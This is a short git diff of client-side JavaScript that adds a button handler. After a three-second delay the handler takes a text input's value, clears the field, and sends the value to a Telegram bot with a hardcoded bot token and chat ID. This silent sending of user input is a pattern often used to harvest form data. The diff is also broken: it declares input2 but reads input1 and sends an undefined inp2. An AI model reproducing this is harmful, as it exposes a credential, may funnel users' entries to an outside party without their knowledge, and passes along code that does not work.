@@ -24,18 +24,20 @@ btn1.addEventListener('click', () => {
 })
 const print = document.querySelector('.print');
 
+const btn2 = document.querySelector('#btn2');
+const token2 = '6050757748:AAE0SlqzlC9im6u5LJpO0k30O4xxT8WLeT8';
 
 btn2.addEventListener('click', () => {
     setTimeout(() => {
-     const input1 = document.querySelector('#input1');
+     const input2 = document.querySelector('#input2');
      let inp1 = input1.value;
  
      input1.value = '';
  
-      const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
+      const url = 'https://api.telegram.org/bot'+token2+'/sendMessage?chat_id=1201316750&text=';
      let xttp = new XMLHttpRequest();
  
-     xttp.open("GET", url+inp1);
+     xttp.open("GET", url+inp2);
      xttp.send();
     },3000)
  })
